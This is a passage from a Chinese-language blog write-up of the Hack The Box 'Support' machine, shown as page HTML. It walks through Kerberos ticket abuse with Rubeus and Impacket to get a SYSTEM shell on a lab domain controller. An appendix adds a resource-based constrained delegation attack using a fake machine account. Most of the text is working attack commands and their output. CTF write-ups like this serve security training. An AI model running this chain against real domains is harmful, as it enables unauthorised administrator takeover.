class="hljs-number">39</span>WJQdcMPrYbrVZwnk47w4sNBBOvIK9/MYA5GzgsTacJaHiGDJLuOAZ0i+VbHkSTGp9+e2G6hzs+G4iJ<br>      kxRKfUVjLTBt2YGXhpGCInp533bizhYaW+uJbgX2fXZIhLd18awb9EQVDkWDjeUSup0Duk+<span class="hljs-number">42L</span>61Z2UJ<br>      h2OPKBEcvcwtFBkobUn8Ge7j0UqVYIDHCDywOwE0QqqpVp2uOHcGwy1zoY+pwrCwr/zp6Mx5U7r2dfaF<br>      <span class="hljs-number">1</span>CXKBsdW2UPEEUPhAtzqrYFg9d8eTfFCQbsHDqj5/zjKOp1mHChgIZmGHwIAOSkq+C9igYjf/+L+B7A/<br>      o4HZMIHWoAMCAQCigc4Egct9gcgwgcWggcIwgb8wgbygGzAZoAMCARGhEgQQOgVjBKQi2qi+cNLOb/cm<br>      k6ENGwtTVVBQT1JULkhUQqIaMBigAwIBCqERMA8bDWFkbWluaXN0cmF0b3KjBwMFAEClAAClERgPMjAy<br>      NDAzMjEwMzIzMjVaphEYDzIwMjQwMzIxMTMyMzI1WqcRGA8yMDI0MDMyODAzMjMyNVqoDRsLU1VQUE9S<br>      VC5IVEKpITAfoAMCAQKhGDAWGwRjaWZzGw5kYy5zdXBwb3J0Lmh0Yg==<br>[+] Ticket successfully imported!<br>*Evil-WinRM* PS C:\Users\support\Desktop&gt;<br></code></pre></td></tr></table></figure>

<p>32、查看票据情况</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs c">*Evil-WinRM* PS C:\Users\support\Desktop&gt; .\Rubeus.exe klist<br><br>   ______        _<br>  (_____ \      | |<br>   _____) )_   _| |__  _____ _   _  ___<br>  |  __  /| | | |  _ \| ___ | | | |/___)<br>  | |  \ \| |_| | |_) ) ____| |_| |___ |<br>  |_|   |_|____/|____/|_____)____/(___/<br><br>  v1<span class="hljs-number">.6</span><span class="hljs-number">.4</span><br><br><br>Action: List Kerberos Tickets (Current User)<br><br>[*] Current LUID    : <span class="hljs-number">0x228020</span><br><br>  UserName                 : support<br>  Domain                   : SUPPORT<br>  LogonId                  : <span class="hljs-number">0x228020</span><br>  UserSID                  : S<span class="hljs-number">-1</span><span class="hljs-number">-5</span><span class="hljs-number">-21</span><span class="hljs-number">-1677581083</span><span class="hljs-number">-3380853377</span><span class="hljs-number">-188903654</span><span class="hljs-number">-1105</span><br>  AuthenticationPackage    : NTLM<br>  LogonType                : Network<br>  LogonTime                : <span class="hljs-number">3</span>/<span class="hljs-number">20</span>/<span class="hljs-number">2024</span> <span class="hljs-number">8</span>:<span class="hljs-number">10</span>:<span class="hljs-number">46</span> PM<br>  LogonServer              : DC<br>  LogonServerDNSDomain     : support.htb<br>  UserPrincipalName        : support@support.htb<br><br>    [<span class="hljs-number">0</span>] - <span class="hljs-number">0x12</span> - aes256_cts_hmac_sha1<br>      Start/End/MaxRenew: <span class="hljs-number">3</span>/<span class="hljs-number">20</span>/<span class="hljs-number">2024</span> <span class="hljs-number">8</span>:<span class="hljs-number">23</span>:<span class="hljs-number">25</span> PM ; <span class="hljs-number">3</span>/<span class="hljs-number">21</span>/<span class="hljs-number">2024</span> <span class="hljs-number">6</span>:<span class="hljs-number">23</span>:<span class="hljs-number">25</span> AM ; <span class="hljs-number">3</span>/<span class="hljs-number">27</span>/<span class="hljs-number">2024</span> <span class="hljs-number">8</span>:<span class="hljs-number">23</span>:<span class="hljs-number">25</span> PM<br>      Server Name       : cifs/dc.support.htb @ SUPPORT.HTB<br>      Client Name       : administrator @ SUPPORT.HTB<br>      Flags             : name_canonicalize, ok_as_delegate, pre_authent, renewable, forwardable (<span class="hljs-number">40</span>a50000)<br><br>*Evil-WinRM* PS C:\Users\support\Desktop&gt;<br></code></pre></td></tr></table></figure>

<p>33、远程使用，我将获取最后生成的票证Rubeus，并将其复制回我的计算机，将其另存为ticket.kirbi.b64，确保删除所有空格。我将其 base64 解码为ticket.kirbi：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c">┌──(kali㉿offsec)-[~/Desktop]<br>└─$ base64 -d ticket.kirbi.b64 &gt; ticket.kirbi<br><br>┌──(kali㉿offsec)-[~/Desktop]<br>└─$ impacket-ticketConverter ticket.kirbi ticket.ccache <br>Impacket v0<span class="hljs-number">.11</span><span class="hljs-number">.0</span> - Copyright <span class="hljs-number">2023</span> Fortra<br><br>[*] converting kirbi to ccache...<br>[+] done<br></code></pre></td></tr></table></figure>

<p>34、我可以使用它来获取 shell psexec.py：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs c">┌──(kali㉿offsec)-[~/Desktop]<br>└─$ KRB5CCNAME=ticket.ccache impacket-psexec support.htb/administrator@dc.support.htb -k -no-pass<br>Impacket v0<span class="hljs-number">.11</span><span class="hljs-number">.0</span> - Copyright <span class="hljs-number">2023</span> Fortra<br><br>[*] Requesting shares on dc.support.htb.....<br>[*] Found writable share ADMIN$<br>[*] Uploading file OfkknBGb.exe<br>[*] Opening SVCManager on dc.support.htb.....<br>[*] Creating service DCRe on dc.support.htb.....<br>[*] Starting service DCRe.....<br>[!] Press help <span class="hljs-keyword">for</span> extra shell commands<br>Microsoft Windows [Version <span class="hljs-number">10.0</span><span class="hljs-number">.20348</span><span class="hljs-number">.859</span>]<br>(c) Microsoft Corporation. All rights reserved.<br><br>C:\Windows\system32&gt; whoami<br>nt authority\system<br><br>C:\Windows\system32&gt; cd C:\Users\Administrator\Desktop<br><br>C:\Users\Administrator\Desktop&gt;dir<br> Volume in drive C has no label.<br> Volume Serial Number is <span class="hljs-number">955</span>A<span class="hljs-number">-5</span>CBB<br><br> Directory of C:\Users\Administrator\Desktop<br><br><span class="hljs-number">05</span>/<span class="hljs-number">28</span>/<span class="hljs-number">2022</span>  <span class="hljs-number">04</span>:<span class="hljs-number">17</span> AM    &lt;DIR&gt;          .<br><span class="hljs-number">05</span>/<span class="hljs-number">28</span>/<span class="hljs-number">2022</span>  <span class="hljs-number">04</span>:<span class="hljs-number">11</span> AM    &lt;DIR&gt;          ..<br><span class="hljs-number">03</span>/<span class="hljs-number">20</span>/<span class="hljs-number">2024</span>  <span class="hljs-number">06</span>:<span class="hljs-number">29</span> PM                <span class="hljs-number">34</span> root.txt<br>               <span class="hljs-number">1</span> File(s)             <span class="hljs-number">34</span> bytes<br>               <span class="hljs-number">2</span> Dir(s)   <span class="hljs-number">3</span>,<span class="hljs-number">972</span>,<span class="hljs-number">321</span>,<span class="hljs-number">280</span> bytes <span class="hljs-built_in">free</span><br><br>C:\Users\Administrator\Desktop&gt;<br></code></pre></td></tr></table></figure>

<p>35、获取下最终flag信息</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c">C:\Users\Administrator\Desktop&gt; type root.txt<br><span class="hljs-number">99</span>ed202f462e3da8e669eaee03d6e250<br><br>C:\Users\Administrator\Desktop&gt; <br></code></pre></td></tr></table></figure>

<p><strong>附录：其他方法</strong></p>
<p><code>继续执行该计划，我们将使用evil-winrm将 Powermad 上传到目标服务器。随后，提供的命令将向 AD 对象添加一台假计算机，使用约束委派权限配置新的假计算机，并为这个新创建的实体生成密码哈希。</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br></pre></td><td class="code"><pre><code class="hljs c">*Evil-WinRM* PS C:\Users\support\Desktop&gt; <br>*Evil-WinRM* PS C:\Users\support\Desktop&gt; Set-Variable -Name <span class="hljs-string">&quot;FakePC&quot;</span> -Value <span class="hljs-string">&quot;FAKE01&quot;</span><br>*Evil-WinRM* PS C:\Users\support\Desktop&gt; Set-Variable -Name <span class="hljs-string">&quot;targetComputer&quot;</span> -Value <span class="hljs-string">&quot;DC&quot;</span><br>*Evil-WinRM* PS C:\Users\support\Desktop&gt; New-MachineAccount -MachineAccount (Get-Variable -Name <span class="hljs-string">&quot;FakePC&quot;</span>).Value -Password $(ConvertTo-SecureString <span class="hljs-string">&#x27;123456&#x27;</span> -AsPlainText -Force) -Verbose<br>Verbose: [+] Domain Controller = dc.support.htb<br>Verbose: [+] Domain = support.htb<br>Verbose: [+] SAMAccountName = FAKE01$<br>Verbose: [+] Distinguished Name = CN=FAKE01,CN=Computers,DC=support,DC=htb<br>[+] Machine account FAKE01 added<br>*Evil-WinRM* PS C:\Users\support\Desktop&gt; Set-ADComputer (Get-Variable -Name <span class="hljs-string">&quot;targetComputer&quot;</span>).Value -PrincipalsAllowedToDelegateToAccount ((Get-Variable -Name <span class="hljs-string">&quot;FakePC&quot;</span>).Value + <span class="hljs-string">&#x27;$&#x27;</span>)<br>*Evil-WinRM* PS C:\Users\support\Desktop&gt; Get-ADComputer (Get-Variable -Name <span class="hljs-string">&quot;targetComputer&quot;</span>).Value -Properties PrincipalsAllowedToDelegateToAccount<br><br><br>DistinguishedName                    : CN=DC,OU=Domain Controllers,DC=support,DC=htb<br>DNSHostName                          : dc.support.htb<br>Enabled                              : True<br>Name                                 : DC<br>ObjectClass                          : computer<br>ObjectGUID                           : afa13f1c<span class="hljs-number">-0399</span><span class="hljs-number">-4f</span>7e<span class="hljs-number">-863f</span>-e9c3b94c4127<br>PrincipalsAllowedToDelegateToAccount : &#123;CN=FAKE01,CN=Computers,DC=support,DC=htb&#125;<br>SamAccountName                       : DC$<br>SID                                  : S<span class="hljs-number">-1</span><span class="hljs-number">-5</span><span class="hljs-number">-21</span><span class="hljs-number">-1677581083</span><span class="hljs-number">-3380853377</span><span class="hljs-number">-188903654</span><span class="hljs-number">-1000</span><br>UserPrincipalName                    :<br><br><br><br>*Evil-WinRM* PS C:\Users\support\Desktop&gt;<br><br><br>通过“New-MachineAccount”命令成功将虚假计算机对象添加到 AD 后，后续步骤涉及利用内置 AD 模块。具体来说，“Set-ADComputer”命令用于向新添加的假计算机授予约束委派权限。最后的“Get-ADComputer”命令用作验证步骤，确保已添加由 CN FAKE01 表示的计算机。在 Windows 中，添加计算机对象的默认配额通常设置为 <span class="hljs-number">10</span>。<br><br><br>Get-DomainObject -Identity <span class="hljs-string">&#x27;DC=SUPPORT,DC=HTB&#x27;</span> | select ms-ds-machineaccountquota<br><br><br>*Evil-WinRM* PS C:\Users\support\Documents&gt; cd ../Desktop<br>*Evil-WinRM* PS C:\Users\support\Desktop&gt; Import-Module ./Powermad.ps1<br>*Evil-WinRM* PS C:\Users\support\Desktop&gt; Get-DomainObject -Identity <span class="hljs-string">&#x27;DC=SUPPORT,DC=HTB&#x27;</span> | select ms-ds-machineaccountquota<br>The term <span class="hljs-string">&#x27;Get-DomainObject&#x27;</span> is not recognized as the name of a cmdlet, function, script file, or operable program. Check the spelling of the name, or <span class="hljs-keyword">if</span> a path was included, verify that the path is correct and try again.<br>At line:<span class="hljs-number">1</span> <span class="hljs-type">char</span>:<span class="hljs-number">1</span><br>+ Get-DomainObject -Identity <span class="hljs-string">&#x27;DC=SUPPORT,DC=HTB&#x27;</span> | select ms-ds-machine ...<br>+ ~~~~~~~~~~~~~~~~<br>    + CategoryInfo          : ObjectNotFound: (Get-DomainObject:String) [], CommandNotFoundException<br>    + FullyQualifiedErrorId : CommandNotFoundException<br>*Evil-WinRM* PS C:\Users\support\Desktop&gt; <br>                                        <br>Warning: Press <span class="hljs-string">&quot;y&quot;</span> to <span class="hljs-built_in">exit</span>, press any other key to <span class="hljs-keyword">continue</span><br>*Evil-WinRM* PS C:\Users\support\Desktop&gt; Import-Module ./PowerView.ps1<br>*Evil-WinRM* PS C:\Users\support\Desktop&gt; Get-DomainObject -Identity <span class="hljs-string">&#x27;DC=SUPPORT,DC=HTB&#x27;</span> | select ms-ds-machineaccountquota<br><br>ms-ds-machineaccountquota<br>-------------------------<br>                       <span class="hljs-number">10</span><br><br><br>*Evil-WinRM* PS C:\Users\support\Desktop&gt; <br><br><br>展望未来，我们的下一步涉及使用 Rubeus 为新创建的假计算机对象生成密码哈希值。假设我们将此对象的密码设置为“<span class="hljs-number">123456</span>”，我们将把 Rubeus.exe 上传到目标服务器并执行指定的命令。此操作将促进用户服务 (S4U) 攻击，使我们能够代表管理员获取 Kerberos 票证。<br><br>.\Rubeus.exe  hash /password:<span class="hljs-number">123456</span> /user:FAKE01$ /domain:support.htb<br><br><br>*Evil-WinRM* PS C:\Users\support\Desktop&gt; .\Rubeus.exe  hash /password:<span class="hljs-number">123456</span> /user:FAKE01$ /domain:support.htb<br><br>   ______        _<br>  (_____ \      | |<br>   _____) )_   _| |__  _____ _   _  ___<br>  |  __  /| | | |  _ \| ___ | | | |/___)<br>  | |  \ \| |_| | |_) ) ____| |_| |___ |<br>  |_|   |_|____/|____/|_____)____/(___/<br><br>  v1<span class="hljs-number">.6</span><span class="hljs-number">.4</span><br><br><br>[*] Action: Calculate Password Hash(es)<br><br>[*] Input password             : <span class="hljs-number">123456</span><br>[*] Input username             : FAKE01$<br>[*] Input domain               : support.htb<br>[*] Salt                       : SUPPORT.HTBhostfake01.support.htb<br>[*]       rc4_hmac             : <span class="hljs-number">32</span>ED87BDB5FDC5E9CBA88547376818D4<br>[*]       aes128_cts_hmac_sha1 : <span class="hljs-number">4799</span>D0F80833802EE7F1412BD30DCD5C<br>[*]       aes256_cts_hmac_sha1 : <span class="hljs-number">35</span>CE465C01BC1577DE3410452165E5244779C17B64E6D89459C1EC3C8DAA362B<br>[*]       des_cbc_md5          : <span class="hljs-number">836</span>D4C85A4F23B62<br><br>*Evil-WinRM* PS C:\Users\support\Desktop&gt;<br><br><br>成功利用该安全漏洞并授予计算机对象 FAKE01 冒充他人的权利后，我们的下一步是请求新的 Kerberos 票证授予票证 (TGT)。该请求将从我们的攻击 Kali 计算机发出，允许我们在模拟用户管理员的同时访问 dc.support.htb 上的资源。<br><br><br>impacket-getST support.htb/FAKE01 -dc-ip dc.support.htb -impersonate administrator -spn http/dc.support.htb -aesKey <span class="hljs-number">35</span>CE465C01BC1577DE3410452165E5244779C17B64E6D89459C1EC3C8DAA362B<br><br>┌──(kali㉿offsec)-[~/Desktop]<br>└─$ impacket-getST support.htb/FAKE01 -dc-ip dc.support.htb -impersonate administrator -spn http/dc.support.htb -aesKey <span class="hljs-number">35</span>CE465C01BC1577DE3410452165E5244779C17B64E6D89459C1EC3C8DAA362B<br>Impacket v0<span class="hljs-number">.11</span><span class="hljs-number">.0</span> - Copyright <span class="hljs-number">2023</span> Fortra<br><br>[-] CCache file is not found. Skipping...<br>[*] Getting TGT <span class="hljs-keyword">for</span> user<br>[*] Impersonating administrator<br>[*]     Requesting S4U2self<br>[*]     Requesting S4U2Proxy<br>[*] Saving ticket in administrator.ccache<br><br><br>KRB5CCNAME=administrator.ccache impacket-smbexec support.htb/administrator@dc.support.htb -no-pass -k<br><br><br>┌──(kali㉿offsec)-[~/Desktop]<br>└─$ KRB5CCNAME=administrator.ccache impacket-smbexec support.htb/administrator@dc.support.htb -no-pass -k<br>Impacket v0<span class="hljs-number">.11</span><span class="hljs-number">.0</span> - Copyright <span class="hljs-number">2023</span> Fortra<br><br>[!] Launching semi-interactive shell - Careful what you execute<br>C:\Windows\system32&gt;whoami<br>nt authority\system<br><br>C:\Windows\system32&gt;cd C:/Users/Administrator/Desktop<br>[-] You can<span class="hljs-number">&#x27;</span>t CD under SMBEXEC. Use full paths.<br>C:\Windows\system32&gt;type C:\Users\Administrator\Desktop\root.txt<br><span class="hljs-number">99</span>ed202f462e3da8e669eaee03d6e250<br><br>C:\Windows\system32&gt;<br></code></pre></td></tr></table></figure>


<h4 id="0x03-通关凭证展示"><a href="#0x03-通关凭证展示" class="headerlink" title="0x03 通关凭证展示"></a>0x03 通关凭证展示</h4><p><code>https://www.hackthebox.com/achievement/machine/1705469/484</code></p>

                
              </div>
            
            <hr/>
            <div>
              <div class="post-metas my-3">
  
    <div class="post-meta mr-3 d-flex align-items-center">
      <i class="iconfont icon-category"></i>
      

<span class="category-chains">
  
  
    
      <span class="category-chain">
        
  <a href="/categories/%E6%89%93%E9%9D%B6%E8%AE%B0/" class="category-chain-item">打靶记</a>
  
  

      </span>
    
  
</span>

    </div>
  
  
    <div class="post-meta">
      <i class="iconfont icon-tags"></i>
      
        <a href="/tags/shooting-range/" class="print-no-link">#shooting-range</a>
      
    </div>
  
</div>


              
  

  <div class="license-box my-3">
    <div class="license-title">
      <div>Support-htb-writeup</div>
      <div>https://sh1yan.top/2024/03/20/Support-htb-writeup/</div>
    </div>
    <div class="license-meta">
      
        <div class="license-meta-item">
          <div>作者</div>
          <div>shiyan</div>
        </div>
      
      
        <div class="license-meta-item license-meta-date">
          <div>发布于</div>
          <div>2024年3月20日</div>
        </div>
      
      
      
        <div class="license-meta-item">
          <div>许可协议</div>
          <div>
            
              
              
                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
                    <i class="iconfont icon-by"></i>
                  </span>
                </a>
              
            
          </div>
        </div>
      
    </div>
    <div class="license-icon iconfont"></div>
  </div>



              
                <div class="post-prevnext my-3">
                  <article class="post-prev col-6">
                    
                    
                      <a href="/2024/03/21/Bounty-htb-writeup/" title="Bounty-htb-writeup">
                        <i class="iconfont icon-arrowleft"></i>
                        <span class="hidden-mobile">Bounty-htb-writeup</span>
                        <span class="visible-mobile">上一篇</span>
                      </a>
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="/2024/03/19/Timelapse-htb-writeup/" title="Timelapse-htb-writeup">
                        <span class="hidden-mobile">Timelapse-htb-writeup</span>
                        <span class="visible-mobile">下一篇</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
          </article>
        </div>
      </div>
    </div>

    <div class="side-col d-none d-lg-block col-lg-2">
      
  <aside class="sidebar" style="margin-left: -1rem">
    <div id="toc">
  <p class="toc-header">
    <i class="iconfont icon-list"></i>
    <span>目录</span>
  </p>
  <div class="toc-body" id="toc-body"></div>
</div>



  </aside>


    </div>
  </div>
</div>





  



  



  



  



  







    

    
      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>

    

    
  </main>

  <footer>
    <div class="footer-inner">
  
    <div class="footer-content">
       <a  rel="nofollow noopener"><span>Copyrights &copy; 2016-2025</span></a> <i class="iconfont icon-love"></i> <a  rel="nofollow noopener"><span>shiyan</span></a> 
    </div>
  
  
  
  
</div>

  </footer>

  <!-- Scripts -->
  
  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
    NProgress.start()
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
<script  src="/js/events.js" ></script>
<script  src="/js/plugins.js" ></script>


  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
  <script>
    (function (window, document) {
      var typing = Fluid.plugins.typing;
      var subtitle = document.getElementById('subtitle');
      if (!subtitle || !typing) {
        return;
      }
      var text = subtitle.getAttribute('data-typed-text');
      
        typing(text);
      
    })(window, document);
  </script>




  
    <script  src="/js/img-lazyload.js" ></script>
  




  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
    var toc = jQuery('#toc');
    if (toc.length === 0 || !window.tocbot) { return; }
    var boardCtn = jQuery('#board-ctn');
    var boardTop = boardCtn.offset().top;

    window.tocbot.init(Object.assign({
      tocSelector     : '#toc-body',
      contentSelector : '.markdown-body',
      linkClass       : 'tocbot-link',
      activeLinkClass : 'tocbot-active-link',
      listClass       : 'tocbot-list',
      isCollapsedClass: 'tocbot-is-collapsed',
      collapsibleClass: 'tocbot-is-collapsible',
      scrollSmooth    : true,
      includeTitleTags: true,
      headingsOffset  : -boardTop,
    }, CONFIG.toc));
    if (toc.find('.toc-list-item').length > 0) {
      toc.css('visibility', 'visible');
    }

    Fluid.events.registerRefreshCallback(function() {
      if ('tocbot' in window) {
        tocbot.refresh();
        var toc = jQuery('#toc');
        if (toc.length === 0 || !tocbot) {
          return;
        }
        if (toc.find('.toc-list-item').length > 0) {
          toc.css('visibility', 'visible');
        }
      }
    });
  });
</script>


  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>

  <script>Fluid.plugins.codeWidget();</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
    window.anchors.options = {
      placement: CONFIG.anchorjs.placement,
      visible  : CONFIG.anchorjs.visible
    };
    if (CONFIG.anchorjs.icon) {
      window.anchors.options.icon = CONFIG.anchorjs.icon;
    }
    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
    var res = [];
    for (var item of el) {
      res.push('.markdown-body > ' + item.trim());
    }
    if (CONFIG.anchorjs.placement === 'left') {
      window.anchors.options.class = 'anchorjs-link-left';
    }
    window.anchors.add(res.join(', '));

    Fluid.events.registerRefreshCallback(function() {
      if ('anchors' in window) {
        anchors.removeAll();
        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
        var res = [];
        for (var item of el) {
          res.push('.markdown-body > ' + item.trim());
        }
        if (CONFIG.anchorjs.placement === 'left') {
          anchors.options.class = 'anchorjs-link-left';
        }
        anchors.add(res.join(', '));
      }
    });
  });
</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
    Fluid.plugins.fancyBox();
  });
</script>


  <script>Fluid.plugins.imageCaption();</script>

  <script  src="/js/local-search.js" ></script>





<!-- 主题的启动项，将它保持在最底部 -->
<!-- the boot of the theme, keep it at the bottom -->
<script  src="/js/boot.js" ></script>


  

  <noscript>
    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
  </noscript>
</body>
</html>
